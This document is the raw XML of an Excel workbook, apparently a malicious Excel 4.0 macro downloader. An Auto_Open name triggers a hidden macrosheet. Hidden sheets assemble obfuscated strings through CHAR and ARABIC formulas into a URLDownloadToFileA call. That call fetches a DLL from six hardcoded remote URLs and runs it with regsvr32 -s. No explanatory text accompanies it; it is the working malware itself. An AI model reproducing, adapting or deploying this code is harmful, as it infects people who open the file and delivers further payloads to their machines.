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bob\Desktop\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <bookViews>
    <workbookView xWindow="-120" yWindow="-120" windowWidth="20730" windowHeight="11160"/>
  </bookViews>
  <sheets>
    <sheet name="Sheet" sheetId="1" r:id="rId1"/>
    <sheet name="Rhjfk" sheetId="2" state="hidden" r:id="rId2"/>
    <sheet name="Ovsrbxf" sheetId="3" state="hidden" r:id="rId3"/>
    <sheet name="Hthdngc" sheetId="4" state="hidden" r:id="rId4"/>
    <sheet name="Fccv" sheetId="5" state="hidden" r:id="rId5"/>
    <sheet name="Gtjjf" sheetId="8" state="hidden" r:id="rId6"/>
    <sheet name="HRg" sheetId="7" state="hidden" r:id="rId7"/>
    <sheet name="EGSBBB" sheetId="6" state="hidden" r:id="rId8"/>
  </sheets>
  <definedNames>
    <definedName name="NRGV1">EGSBBB!$D$12</definedName>
    <definedName name="NRGV2">EGSBBB!$D$14</definedName>
    <definedName name="NRGV3">EGSBBB!$D$16</definedName>
    <definedName name="NRGV4">EGSBBB!$D$18</definedName>
    <definedName name="NRGV5">EGSBBB!$D$20</definedName>
    <definedName name="NRGV6">EGSBBB!$D$22</definedName>
    <definedName name="NRGV7">EGSBBB!$D$24</definedName>
    <definedName name="_xlnm.Auto_Open">EGSBBB!$D$1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1" i="3" l="1"/>
  <c r="J18" i="3"/>
  <c r="J21" i="3"/>
  <c r="F21" i="3"/>
  <c r="H18" i="3"/>
  <c r="F18" i="3"/>
  <c r="D3" i="4"/>
  <c r="P2" i="4"/>
  <c r="D15" i="4"/>
  <c r="L12" i="3"/>
  <c r="I5" i="3"/>
  <c r="C9" i="4"/>
  <c r="F14" i="3"/>
  <c r="C9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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="21" uniqueCount="21">
  <si>
    <t>-</t>
  </si>
  <si>
    <t>G</t>
  </si>
  <si>
    <t>p</t>
  </si>
  <si>
    <t>h</t>
  </si>
  <si>
    <t>t</t>
  </si>
  <si>
    <t>!</t>
  </si>
  <si>
    <t>/</t>
  </si>
  <si>
    <t>regsvr32.exe</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;0, </t>
  </si>
  <si>
    <t>SysWow64\</t>
  </si>
  <si>
    <t>\Windows\</t>
  </si>
  <si>
    <t>",0,0)</t>
  </si>
  <si>
    <t>www.restaurantgaig.com/wp-includes/HLDoANj/","</t>
  </si>
  <si>
    <t>www.grandfurniture.com/thegrandbrands/eGd55tEm9qkPNOhViP/","</t>
  </si>
  <si>
    <t>www.hiway91.com/wp-content/Y/","</t>
  </si>
  <si>
    <t>http://</t>
  </si>
  <si>
    <t>https://</t>
  </si>
  <si>
    <t>http://harleyqueretaro.com/renew2019/Back2016-12-22/cv/data/RjuiFMp4Fsp/","</t>
  </si>
  <si>
    <t>http://hoatuoiso1.com/replace/fVea/","</t>
  </si>
  <si>
    <t>https://rumkeke.com/wp-admin/A8/","</t>
  </si>
  <si>
    <t>,0,"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</si>
</sst>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8D4D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2" borderId="0" xfId="0" applyFill="1"/>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId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xlIntlMacrosheet" Target="macrosheets/intlsheet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527078</xdr:colOff>
      <xdr:row>0</xdr:row>
      <xdr:rowOff>266700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E6C95142-F316-42EB-B603-F83FF2704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890278" cy="266700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D9"/>
  <sheetViews>
    <sheetView showFormulas="1" topLeftCell="D1" workbookViewId="0">
      <selection activeCell="D6" sqref="D6"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <cols>
    <col min="4" max="4" width="255.7265625" bestFit="1" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="9" spans="4:4" x14ac:dyDescent="0.35">
      <c r="D9" t="b">
        <f>FORMULA(Rhjfk!P22&amp;Rhjfk!H9&amp;Rhjfk!L2&amp;Rhjfk!B15&amp;Rhjfk!B15&amp;Ovsrbxf!C9&amp;Ovsrbxf!F14&amp;Hthdngc!C9&amp;Ovsrbxf!I5&amp;Rhjfk!H4&amp;Ovsrbxf!L12&amp;Hthdngc!K21&amp;Ovsrbxf!F18&amp;Hthdngc!P2&amp;Hthdngc!H18,D12)=FORMULA(Rhjfk!P22&amp;Rhjfk!J11&amp;Rhjfk!B18&amp;Rhjfk!P11&amp;"NRGV1"&amp;Hthdngc!S7&amp;Rhjfk!H9&amp;Rhjfk!L2&amp;Rhjfk!B15&amp;Rhjfk!B15&amp;Ovsrbxf!C9&amp;Ovsrbxf!F14&amp;Hthdngc!C9&amp;Ovsrbxf!I5&amp;Rhjfk!H4&amp;Ovsrbxf!L12&amp;Hthdngc!K21&amp;Ovsrbxf!H18&amp;Hthdngc!P2&amp;Hthdngc!H18&amp;Rhjfk!P13,D14)=FORMULA(Rhjfk!P22&amp;Rhjfk!J11&amp;Rhjfk!B18&amp;Rhjfk!P11&amp;"NRGV2"&amp;Hthdngc!S7&amp;Rhjfk!H9&amp;Rhjfk!L2&amp;Rhjfk!B15&amp;Rhjfk!B15&amp;Ovsrbxf!C9&amp;Ovsrbxf!F14&amp;Hthdngc!C9&amp;Ovsrbxf!I5&amp;Rhjfk!H4&amp;Ovsrbxf!L12&amp;Hthdngc!K21&amp;Ovsrbxf!F21&amp;Hthdngc!P2&amp;Hthdngc!H18&amp;Rhjfk!P13,D16)=FORMULA(Rhjfk!P22&amp;Rhjfk!J11&amp;Rhjfk!B18&amp;Rhjfk!P11&amp;"NRGV3"&amp;Hthdngc!S7&amp;Rhjfk!H9&amp;Rhjfk!L2&amp;Rhjfk!B15&amp;Rhjfk!B15&amp;Ovsrbxf!C9&amp;Ovsrbxf!F14&amp;Hthdngc!C9&amp;Ovsrbxf!I5&amp;Rhjfk!H4&amp;Ovsrbxf!L12&amp;Hthdngc!K21&amp;Ovsrbxf!H21&amp;Hthdngc!P2&amp;Hthdngc!H18&amp;Rhjfk!P13,D18)=FORMULA(Rhjfk!P22&amp;Rhjfk!J11&amp;Rhjfk!B18&amp;Rhjfk!P11&amp;"NRGV4"&amp;Hthdngc!S7&amp;Rhjfk!H9&amp;Rhjfk!L2&amp;Rhjfk!B15&amp;Rhjfk!B15&amp;Ovsrbxf!C9&amp;Ovsrbxf!F14&amp;Hthdngc!C9&amp;Ovsrbxf!I5&amp;Rhjfk!H4&amp;Ovsrbxf!L12&amp;Hthdngc!K21&amp;Ovsrbxf!J18&amp;Hthdngc!P2&amp;Hthdngc!H18&amp;Rhjfk!P13,D20)=FORMULA(Rhjfk!P22&amp;Rhjfk!J11&amp;Rhjfk!B18&amp;Rhjfk!P11&amp;"NRGV5"&amp;Hthdngc!S7&amp;Rhjfk!H9&amp;Rhjfk!L2&amp;Rhjfk!B15&amp;Rhjfk!B15&amp;Ovsrbxf!C9&amp;Ovsrbxf!F14&amp;Hthdngc!C9&amp;Ovsrbxf!I5&amp;Rhjfk!H4&amp;Ovsrbxf!L12&amp;Hthdngc!K21&amp;Ovsrbxf!J21&amp;Hthdngc!P2&amp;Hthdngc!H18&amp;Rhjfk!P13,D22)=FORMULA(Rhjfk!P22&amp;Rhjfk!J11&amp;Rhjfk!B18&amp;Rhjfk!P11&amp;"NRGV6"&amp;Hthdngc!S7&amp;Rhjfk!H9&amp;Rhjfk!B15&amp;Rhjfk!I17&amp;Rhjfk!I3&amp;Rhjfk!H13&amp;Rhjfk!P11&amp;Rhjfk!K9&amp;Rhjfk!P13&amp;Rhjfk!P7&amp;Rhjfk!P13,D24)=FORMULA(Rhjfk!P22&amp;Rhjfk!H13&amp;Rhjfk!N4&amp;Rhjfk!H13&amp;Rhjfk!H9&amp;Rhjfk!P11&amp;Rhjfk!P15&amp;Rhjfk!H9&amp;Rhjfk!P20&amp;Hthdngc!O14&amp;Hthdngc!P10&amp;Hthdngc!K6&amp;Hthdngc!D3&amp;Hthdngc!D15&amp;Rhjfk!P15&amp;Rhjfk!P13,D26)=FORMULA(Rhjfk!P22&amp;Rhjfk!F4&amp;Rhjfk!H13&amp;Rhjfk!E6&amp;Rhjfk!E11&amp;Rhjfk!F4&amp;Rhjfk!K23&amp;Rhjfk!P11&amp;Rhjfk!P13,D30)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rumkeke.com/wp-admin/A8/%22,%22" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://hoatuoiso1.com/replace/fVea/%22,%22" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://harleyqueretaro.com/renew2019/Back2016-12-22/cv/data/RjuiFMp4Fsp/%22,%22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www.hiway91.com/wp-content/Y/%22,%22" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.grandfurniture.com/thegrandbrands/eGd55tEm9qkPNOhViP/%22,%22" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.restaurantgaig.com/wp-includes/HLDoANj/%22,%2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AL676" sqref="AL676"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <sheetData>
    <row r="1" s="1" customFormat="1" ht="21.75" customHeight="1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Q37"/>
  <sheetViews>
    <sheetView topLeftCell="A4" workbookViewId="0">
      <selection activeCell="A3" sqref="A3:B3"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <sheetData>
    <row r="2" spans="1:16" x14ac:dyDescent="0.3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3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3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35">
      <c r="B5" t="str">
        <f>CHAR(115+2)</f>
        <v>u</v>
      </c>
      <c r="P5" t="str">
        <f>CHAR(44+2)</f>
        <v>.</v>
      </c>
    </row>
    <row r="6" spans="1:16" x14ac:dyDescent="0.35">
      <c r="E6" t="str">
        <f>CHAR(90-6)</f>
        <v>T</v>
      </c>
      <c r="J6" t="str">
        <f>CHAR(77-3)</f>
        <v>J</v>
      </c>
    </row>
    <row r="7" spans="1:16" x14ac:dyDescent="0.3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3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35">
      <c r="F10" t="str">
        <f>CHAR(123-4)</f>
        <v>w</v>
      </c>
    </row>
    <row r="11" spans="1:16" x14ac:dyDescent="0.3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35">
      <c r="A12" t="str">
        <f>CHAR(107+2)</f>
        <v>m</v>
      </c>
    </row>
    <row r="13" spans="1:16" x14ac:dyDescent="0.3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35">
      <c r="G14" t="str">
        <f>CHAR(124-4)</f>
        <v>x</v>
      </c>
      <c r="K14" t="str">
        <f>CHAR(70-4)</f>
        <v>B</v>
      </c>
    </row>
    <row r="15" spans="1:16" x14ac:dyDescent="0.3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35">
      <c r="D17" t="str">
        <f>CHAR(102-5)</f>
        <v>a</v>
      </c>
      <c r="I17" t="str">
        <f>CHAR(78+1)</f>
        <v>O</v>
      </c>
      <c r="K17" t="s">
        <v>1</v>
      </c>
      <c r="N17" t="s">
        <v>2</v>
      </c>
      <c r="P17" t="str">
        <f>CHAR(40-2)</f>
        <v>&amp;</v>
      </c>
    </row>
    <row r="18" spans="2:16" x14ac:dyDescent="0.35">
      <c r="B18" t="str">
        <f>CHAR(65+5)</f>
        <v>F</v>
      </c>
    </row>
    <row r="19" spans="2:16" x14ac:dyDescent="0.35">
      <c r="F19" t="s">
        <v>3</v>
      </c>
      <c r="L19" t="s">
        <v>4</v>
      </c>
      <c r="P19" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
    </row>
    <row r="20" spans="2:16" x14ac:dyDescent="0.35">
      <c r="H20">
        <v>8</v>
      </c>
      <c r="P20" t="str">
        <f>CHAR(52+6)</f>
        <v>:</v>
      </c>
    </row>
    <row r="22" spans="2:16" x14ac:dyDescent="0.35">
      <c r="P22" t="str">
        <f>CHAR(66-5)</f>
        <v>=</v>
      </c>
    </row>
    <row r="23" spans="2:16" x14ac:dyDescent="0.35">
      <c r="K23" t="str">
        <f>CHAR(80-2)</f>
        <v>N</v>
      </c>
    </row>
    <row r="24" spans="2:16" x14ac:dyDescent="0.35">
      <c r="G24" t="str">
        <f>CHAR(84-2)</f>
        <v>R</v>
      </c>
      <c r="P24" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="26" spans="2:16" x14ac:dyDescent="0.35">
      <c r="I26" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
    </row>
    <row r="27" spans="2:16" x14ac:dyDescent="0.35">
      <c r="P27" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="32" spans="2:16" x14ac:dyDescent="0.35">
      <c r="I32">
        <f>_xlfn.ARABIC("CXI")</f>
        <v>111</v>
      </c>
    </row>
    <row r="33" spans="5:17" x14ac:dyDescent="0.35">
      <c r="O33">
        <f>_xlfn.ARABIC("LXVII")</f>
        <v>67</v>
      </c>
    </row>
    <row r="35" spans="5:17" x14ac:dyDescent="0.35">
      <c r="E35">
        <f>_xlfn.ARABIC("LXI")</f>
        <v>61</v>
      </c>
    </row>
    <row r="36" spans="5:17" x14ac:dyDescent="0.35">
      <c r="Q36">
        <f>_xlfn.ARABIC("CXIV")</f>
        <v>114</v>
      </c>
    </row>
    <row r="37" spans="5:17" x14ac:dyDescent="0.3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5:L21"/>
  <sheetViews>
    <sheetView topLeftCell="A7" workbookViewId="0">
      <selection activeCell="F18" sqref="F18"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <sheetData>
    <row r="5" spans="3:12" x14ac:dyDescent="0.35">
      <c r="I5" t="str">
        <f>T(Rhjfk!D17&amp;Rhjfk!F15&amp;Rhjfk!E6&amp;Rhjfk!E2&amp;Rhjfk!B18&amp;Rhjfk!G2&amp;Rhjfk!C9)</f>
        <v>adToFil</v>
      </c>
    </row>
    <row r="9" spans="3:12" x14ac:dyDescent="0.35">
      <c r="C9" t="str">
        <f>T(Rhjfk!P11&amp;Rhjfk!P15&amp;Rhjfk!B5&amp;Rhjfk!C3&amp;Rhjfk!C9&amp;Rhjfk!A12)</f>
        <v>("urlm</v>
      </c>
    </row>
    <row r="12" spans="3:12" x14ac:dyDescent="0.35">
      <c r="L12" t="str">
        <f>T(Rhjfk!L2&amp;Rhjfk!P15&amp;Rhjfk!P7&amp;Rhjfk!P15&amp;Rhjfk!J6&amp;Rhjfk!J6&amp;Rhjfk!H9&amp;Rhjfk!H9&amp;Rhjfk!K14&amp;Rhjfk!K14&amp;Rhjfk!P15)</f>
        <v>A","JJCCBB"</v>
      </c>
    </row>
    <row r="14" spans="3:12" x14ac:dyDescent="0.35">
      <c r="F14" t="str">
        <f>T(Rhjfk!E2&amp;Rhjfk!D7&amp;Rhjfk!P15&amp;Rhjfk!P7&amp;Rhjfk!P15&amp;Rhjfk!E11&amp;Rhjfk!F4&amp;Rhjfk!B15&amp;Rhjfk!D13)</f>
        <v>on","URLD</v>
      </c>
    </row>
    <row r="18" spans="6:10" x14ac:dyDescent="0.35">
      <c r="F18" t="str">
        <f>T(Fccv!B2)</f>
        <v>http://harleyqueretaro.com/renew2019/Back2016-12-22/cv/data/RjuiFMp4Fsp/","</v>
      </c>
      <c r="H18" t="str">
        <f>T(Fccv!C5)</f>
        <v>http://hoatuoiso1.com/replace/fVea/","</v>
      </c>
      <c r="J18" t="str">
        <f>T(Gtjjf!E8&amp;HRg!F8)</f>
        <v>http://www.grandfurniture.com/thegrandbrands/eGd55tEm9qkPNOhViP/","</v>
      </c>
    </row>
    <row r="21" spans="6:10" x14ac:dyDescent="0.35">
      <c r="F21" t="str">
        <f>T(Fccv!D7)</f>
        <v>https://rumkeke.com/wp-admin/A8/","</v>
      </c>
      <c r="H21" t="str">
        <f>T(Gtjjf!F11&amp;HRg!E6)</f>
        <v>https://www.restaurantgaig.com/wp-includes/HLDoANj/","</v>
      </c>
      <c r="J21" t="str">
        <f>T(Gtjjf!E8&amp;HRg!G10)</f>
        <v>http://www.hiway91.com/wp-content/Y/","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S21"/>
  <sheetViews>
    <sheetView topLeftCell="A7" workbookViewId="0">
      <selection activeCell="K22" sqref="K22"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <sheetData>
    <row r="2" spans="3:19" x14ac:dyDescent="0.35">
      <c r="P2" t="str">
        <f>T(Rhjfk!P5&amp;Rhjfk!P5&amp;Rhjfk!P3&amp;Rhjfk!C3&amp;Rhjfk!B5&amp;Rhjfk!C9&amp;Rhjfk!A12&amp;Rhjfk!P5&amp;Rhjfk!F15&amp;Rhjfk!C9&amp;Rhjfk!C9)</f>
        <v>..\rulm.dll</v>
      </c>
    </row>
    <row r="3" spans="3:19" x14ac:dyDescent="0.35">
      <c r="D3" t="str">
        <f>T(Rhjfk!P19&amp;Rhjfk!P2&amp;Rhjfk!M7)</f>
        <v xml:space="preserve"> -s</v>
      </c>
    </row>
    <row r="6" spans="3:19" x14ac:dyDescent="0.35">
      <c r="K6" t="s">
        <v>7</v>
      </c>
    </row>
    <row r="7" spans="3:19" x14ac:dyDescent="0.35">
      <c r="S7" t="s">
        <v>8</v>
      </c>
    </row>
    <row r="9" spans="3:19" x14ac:dyDescent="0.35">
      <c r="C9" t="str">
        <f>CONCATENATE(Rhjfk!E2&amp;Rhjfk!F10&amp;Rhjfk!D7&amp;Rhjfk!C9&amp;Rhjfk!E2)</f>
        <v>ownlo</v>
      </c>
    </row>
    <row r="10" spans="3:19" x14ac:dyDescent="0.35">
      <c r="P10" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="14" spans="3:19" x14ac:dyDescent="0.35">
      <c r="O14" t="s">
        <v>10</v>
      </c>
    </row>
    <row r="15" spans="3:19" x14ac:dyDescent="0.35">
      <c r="D15" t="str">
        <f>T(Rhjfk!P19&amp;Rhjfk!P5&amp;Rhjfk!P5&amp;Rhjfk!P3&amp;Rhjfk!C3&amp;Rhjfk!B5&amp;Rhjfk!C9&amp;Rhjfk!A12&amp;Rhjfk!P5&amp;Rhjfk!F15&amp;Rhjfk!C9&amp;Rhjfk!C9)</f>
        <v xml:space="preserve"> ..\rulm.dll</v>
      </c>
    </row>
    <row r="18" spans="8:11" x14ac:dyDescent="0.35">
      <c r="H18" t="s">
        <v>11</v>
      </c>
    </row>
    <row r="21" spans="8:11" x14ac:dyDescent="0.35">
      <c r="K21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7"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="D8" sqref="D8"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <sheetData>
    <row r="2" spans="2:4" x14ac:dyDescent="0.35">
      <c r="B2" s="2" t="s">
        <v>17</v>
      </c>
    </row>
    <row r="5" spans="2:4" x14ac:dyDescent="0.35">
      <c r="C5" s="2" t="s">
        <v>18</v>
      </c>
    </row>
    <row r="7" spans="2:4" x14ac:dyDescent="0.35">
      <c r="D7" s="2" t="s">
        <v>19</v>
      </c>
    </row>
  </sheetData>
  <hyperlinks>
    <hyperlink ref="B2" r:id="rId1"/>
    <hyperlink ref="C5" r:id="rId2"/>
    <hyperlink ref="D7" r:id="rId3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8:F11"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="F12" sqref="F12"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <sheetData>
    <row r="8" spans="5:6" x14ac:dyDescent="0.35">
      <c r="E8" s="2" t="s">
        <v>15</v>
      </c>
    </row>
    <row r="11" spans="5:6" x14ac:dyDescent="0.35">
      <c r="F11" s="2" t="s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6:G10"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="D6" sqref="D6"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <sheetData>
    <row r="6" spans="5:7" x14ac:dyDescent="0.35">
      <c r="E6" s="2" t="s">
        <v>12</v>
      </c>
    </row>
    <row r="8" spans="5:7" x14ac:dyDescent="0.35">
      <c r="F8" s="2" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="10" spans="5:7" x14ac:dyDescent="0.35">
      <c r="G10" s="2" t="s">
        <v>14</v>
      </c>
    </row>
  </sheetData>
  <hyperlinks>
    <hyperlink ref="E6" r:id="rId1"/>
    <hyperlink ref="F8" r:id="rId2"/>
    <hyperlink ref="G10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Макросы Excel 4.0</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="8" baseType="lpstr">
      <vt:lpstr>Sheet</vt:lpstr>
      <vt:lpstr>Rhjfk</vt:lpstr>
      <vt:lpstr>Ovsrbxf</vt:lpstr>
      <vt:lpstr>Hthdngc</vt:lpstr>
      <vt:lpstr>Fccv</vt:lpstr>
      <vt:lpstr>Gtjjf</vt:lpstr>
      <vt:lpstr>HRg</vt:lpstr>
      <vt:lpstr>EGSBBB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Пользователь Windows</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2022-03-30T21:24:25Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-03-30T21:24:25Z</dcterms:modified>
</cp:coreProperties>
</file>